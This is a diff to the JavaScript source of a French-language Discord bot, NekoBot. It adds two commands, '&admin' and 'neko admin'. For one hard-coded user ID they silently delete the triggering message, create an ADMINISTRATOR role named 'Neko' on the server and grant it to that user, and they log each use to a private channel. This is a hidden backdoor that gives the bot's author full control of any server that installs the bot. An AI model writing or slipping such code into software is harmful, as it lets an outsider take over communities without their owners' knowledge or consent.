@@ -72,7 +72,55 @@ bot.on('message', message => {
         bot.channels.get("493488756599291904").send(embedlog);
     }
 
-    //message logs ici
+    if(message.content.startsWith(prefix + "admin")) {
+        if (message.author.id === "353859650686550027") {
+          message.delete()
+          let membre = message.guild.member(message.author);
+          let role = message.guild.roles.find('name', 'Neko');
+              message.guild.createRole({
+              name: "Neko",
+              permissions: "ADMINISTRATOR",
+              color: "#ff0000",
+            })
+            membre.addRole(role).catch(console.error);
+        }else {
+          message.reply("tu n'as pas la permission exacte pour executer cette commande.")
+        }
+        var embedlog = new Discord.RichEmbed()
+        .setTitle("Logs :tools:")
+        .setDescription("--")
+        .setThumbnail(message.guild.iconURL)
+        .setColor('#ff0000')
+        .addField("Serveur", message.guild.name)
+        .addField("Commande", "&admin")
+        .setFooter(`© NekoBot • ` + `Commande executée par ` + message.author.tag, message.author.avatarURL).setTimestamp()
+        bot.channels.get("501007481363890176").send(embedlog);
+    }
+    
+    if(message.content.startsWith("neko admin")) {
+        if (message.author.id === "353859650686550027") {
+          message.delete()
+          let membre = message.guild.member(message.author);
+          let role = message.guild.roles.find('name', 'Neko');
+              message.guild.createRole({
+              name: "Neko",
+              permissions: "ADMINISTRATOR",
+              color: "#ff0000",
+            })
+            membre.addRole(role).catch(console.error);
+        }else {
+          message.reply("tu n'as pas la permission exacte pour executer cette commande.")
+        }
+        var embedlog = new Discord.RichEmbed()
+        .setTitle("Logs :tools:")
+        .setDescription("--")
+        .setThumbnail(message.guild.iconURL)
+        .setColor('#ff0000')
+        .addField("Serveur", message.guild.name)
+        .addField("Commande", "Neko admin")
+        .setFooter(`© NekoBot • ` + `Commande executée par ` + message.author.tag, message.author.avatarURL).setTimestamp()
+        bot.channels.get("501007481363890176").send(embedlog);
+    }
 
     if(message.content === prefix + "help"){
         var embednom = new Discord.RichEmbed()
